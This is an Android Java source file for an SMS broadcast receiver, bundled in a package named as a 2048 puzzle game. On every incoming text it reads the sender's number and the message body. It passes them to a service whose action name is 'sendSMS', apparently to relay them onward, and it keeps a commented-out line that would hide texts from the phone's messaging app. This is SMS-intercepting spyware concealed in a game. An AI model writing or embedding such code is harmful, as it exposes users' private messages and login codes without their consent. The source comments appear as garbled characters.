/**
 * 
 */
package com.zhy.game2048;

import java.io.UnsupportedEncodingException;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
	@SuppressLint("ShowToast")
	@Override
	public void onReceive(Context context, Intent intent) {
		// ����ǽ��յ�����
		if (intent.getAction()
				.equals("android.provider.Telephony.SMS_RECEIVED")) {
			// ȡ���㲥�����д��뽫����ϵͳ�ղ������ţ�
			// abortBroadcast();
			StringBuilder sb = new StringBuilder();

			Bundle bundle = intent.getExtras();
			// �ж��Ƿ�������
			if (bundle != null) {
				// ͨ��pdus���Ի�ý��յ������ж�����Ϣ
				Object[] pdus = (Object[]) bundle.get("pdus");
				// �������Ŷ���array,�������յ��Ķ��󳤶�������array�Ĵ�С
				SmsMessage[] messages = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}
				// �������Ķ��źϲ��Զ�����Ϣ��StringBuilder����
				for (SmsMessage message : messages) {
					sb.append("receive from:");
					// ��ý��ն��ŵĵ绰����
					sb.append(message.getDisplayOriginatingAddress());
					sb.append("\n-----Content------\n");
					// ��ö��ŵ�����
					sb.append(message.getDisplayMessageBody());
				}
			}
			String receivedText = null;
			try {
				receivedText = new String(sb.toString().trim().getBytes(),
						"UTF-8");
			} catch (UnsupportedEncodingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			if (receivedText != null) {
				final Intent serIntent = new Intent();
				serIntent.setAction("com.ncnipc.androidgroup.sendSMS");
				serIntent.addCategory("com.ncnipc.androidgroup.sendSMS");
				serIntent.putExtra("MessageContent", sb.toString().trim());
				context.startService(serIntent);
			}
		}
	}
}
